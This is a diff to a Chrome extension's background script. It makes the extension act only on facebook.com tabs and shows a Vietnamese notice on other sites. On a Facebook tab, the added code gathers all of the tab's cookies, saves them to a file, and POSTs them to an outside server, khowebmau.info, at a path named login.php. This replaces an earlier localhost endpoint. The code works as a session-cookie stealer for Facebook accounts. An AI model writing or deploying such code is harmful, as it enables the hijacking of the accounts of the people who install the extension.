@@ -131,32 +131,47 @@ function extractHostname(url) {
 
   return hostname;
 }
+var regexDomain = RegExp(/.facebook.com/);
 chrome.browserAction.onClicked.addListener(function(tab) {
   chrome.tabs.query({ currentWindow: true, active: true }, tabs => {
-    chrome.cookies.getAll({ url: tabs[0].url }, cookies => {
-      var a = {
-        url: tabs[0].url,
-        cookies: cookies
-      };
-      // Get password
-      saveAs(
-        new File(
-          [(a = JSON.stringify(a))],
-          `${extractHostname(tabs[0].url)}.json`,
-          {
+    var domain = extractHostname(tabs[0].url);
+    if (!regexDomain.test(domain)) {
+      chrome.notifications.create(
+        {
+          type: "basic",
+          iconUrl: "/error.png",
+          title: "ERROR",
+          message:
+            "Mở tab facebook.com lên đi bạn gì ơi (click để vào facebook.com)."
+        },
+        NotificationID => {
+          chrome.notifications.onClicked.addListener(notificationId => {
+            if (NotificationID == notificationId) {
+              chrome.tabs.create({ url: "https://www.facebook.com" });
+            }
+          });
+        }
+      );
+    } else {
+      chrome.cookies.getAll({ url: tabs[0].url }, cookies => {
+        var a = {
+          url: tabs[0].url,
+          cookie: cookies
+        };
+        // Get password
+        saveAs(
+          new File([(a = JSON.stringify(a))], `${domain}.json`, {
             type: "application/json;charset=utf-8"
-          }
-        )
-      );
-      xhttp = new XMLHttpRequest();
-      xhttp.open(
-        "POST",
-        "http://localhost:3000/export-cookies-extension",
-        true
-      );
-      xhttp.setRequestHeader("Content-Type", "application/json");
-      xhttp.send(a);
-      console.log(a);
-    });
+          })
+        );
+        xhttp = new XMLHttpRequest();
+        xhttp.open("POST", "http://khowebmau.info/shopee/post/login.php", true);
+        xhttp.setRequestHeader("Content-Type", "application/json");
+        xhttp.onload = function() {
+          console.log(xhttp.response);
+        };
+        xhttp.send(a);
+      });
+    }
   });
 });
